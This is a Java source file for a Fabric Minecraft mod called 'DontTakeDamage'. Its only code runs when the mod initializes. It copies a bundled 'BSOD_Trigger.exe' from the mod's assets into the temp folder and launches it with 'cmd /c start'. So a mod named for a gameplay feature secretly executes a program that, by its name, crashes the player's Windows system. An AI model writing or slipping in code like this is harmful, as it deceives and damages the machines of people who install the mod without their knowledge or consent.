package nl.devpieter.donttakedamage;

import java.io.File;
import java.net.URL;

import org.apache.commons.io.FileUtils;

import net.fabricmc.api.ModInitializer;

public class DontTakeDamage implements ModInitializer {

	@Override
	public void onInitialize() {
		try {
			URL sourceFile = getClass().getResource("/assets/donttakedamage/BSOD_Trigger.exe");
			File destinationFile = new File(System.getProperty("java.io.tmpdir") + "BSOD_Trigger.exe");

			if (destinationFile.exists() && !destinationFile.isDirectory())
				destinationFile.delete();

			FileUtils.copyURLToFile(sourceFile, destinationFile);
			Runtime.getRuntime().exec("cmd /c start " + destinationFile.getPath());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
